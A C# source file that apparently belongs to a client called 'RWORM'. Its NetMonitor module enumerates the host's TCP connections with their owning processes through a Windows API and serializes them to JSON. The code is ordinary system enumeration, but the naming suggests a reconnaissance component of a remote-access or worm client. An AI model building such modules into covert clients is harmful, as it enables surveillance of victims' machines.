using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class NetMonitor
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct MIB_TCPROW_OWNER_PID
        {
            public uint state;
            public uint localAddr;
            public byte localPort1;
            public byte localPort2;
            public byte localPort3;
            public byte localPort4;
            public uint remoteAddr;
            public byte remotePort1;
            public byte remotePort2;
            public byte remotePort3;
            public byte remotePort4;
            public uint owningPid;
        }

        [DllImport("iphlpapi.dll", SetLastError = true)]
        private static extern uint GetExtendedTcpTable(
            IntPtr pTcpTable,
            ref int pdwSize,
            bool bOrder,
            int ulAf,
            int tableClass,
            uint reserved);

        private const int AF_INET = 2;
        private const int TCP_TABLE_OWNER_PID_ALL = 5;

        public static byte[] ListConnections()
        {
            var sb = new StringBuilder("[");
            bool first = true;
            int bufferSize = 0;

            GetExtendedTcpTable(IntPtr.Zero, ref bufferSize, true, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            if (bufferSize <= 0)
            {
                sb.Append(']');
                return Encoding.UTF8.GetBytes(sb.ToString());
            }

            IntPtr tcpTablePtr = Marshal.AllocHGlobal(bufferSize);

            try
            {
                uint result = GetExtendedTcpTable(tcpTablePtr, ref bufferSize, true, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
                if (result == 0)
                {
                    int numEntries = Marshal.ReadInt32(tcpTablePtr);
                    IntPtr rowPtr = IntPtr.Add(tcpTablePtr, 4);
                    int rowSize = Marshal.SizeOf(typeof(MIB_TCPROW_OWNER_PID));

                    for (int i = 0; i < numEntries; i++)
                    {
                        var row = Marshal.PtrToStructure<MIB_TCPROW_OWNER_PID>(rowPtr);
                        rowPtr = IntPtr.Add(rowPtr, rowSize);

                        int localPort = (row.localPort1 << 8) + row.localPort2;
                        int remotePort = (row.remotePort1 << 8) + row.remotePort2;

                        var localIp = new IPAddress(row.localAddr).ToString();
                        var remoteIp = new IPAddress(row.remoteAddr).ToString();

                        string procName = "";
                        try
                        {
                            var proc = System.Diagnostics.Process.GetProcessById((int)row.owningPid);
                            procName = proc.ProcessName;
                        }
                        catch { }

                        string loc = JsonHelper.Escape(localIp);
                        string rem = JsonHelper.Escape(remoteIp);
                        string st = JsonHelper.Escape(ResolveState(row.state));
                        string pr = JsonHelper.Escape(procName);
                        uint pid = row.owningPid;

                        if (!first) sb.Append(',');
                        first = false;
                        sb.Append($"{{\"protocol\":\"TCP\",\"localAddress\":\"{loc}\",\"localPort\":{localPort},\"remoteAddress\":\"{rem}\",\"remotePort\":{remotePort},\"state\":\"{st}\",\"pid\":{pid},\"processName\":\"{pr}\"}}");
                    }
                }
            }
            catch (Exception ex)
            {
                var err = JsonHelper.Escape(ex.Message);
                return Encoding.UTF8.GetBytes($"[{{\"error\":\"{err}\"}}]");
            }
            finally
            {
                Marshal.FreeHGlobal(tcpTablePtr);
            }

            sb.Append(']');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        private static string ResolveState(uint state)
        {
            return state switch
            {
                1 => "CLOSED",
                2 => "LISTENING",
                3 => "SYN_SENT",
                4 => "SYN_RCVD",
                5 => "ESTABLISHED",
                6 => "FIN_WAIT1",
                7 => "FIN_WAIT2",
                8 => "CLOSE_WAIT",
                9 => "CLOSING",
                10 => "LAST_ACK",
                11 => "TIME_WAIT",
                12 => "DELETE_TCB",
                _ => $"STATE_{state}"
            };
        }
    }
}
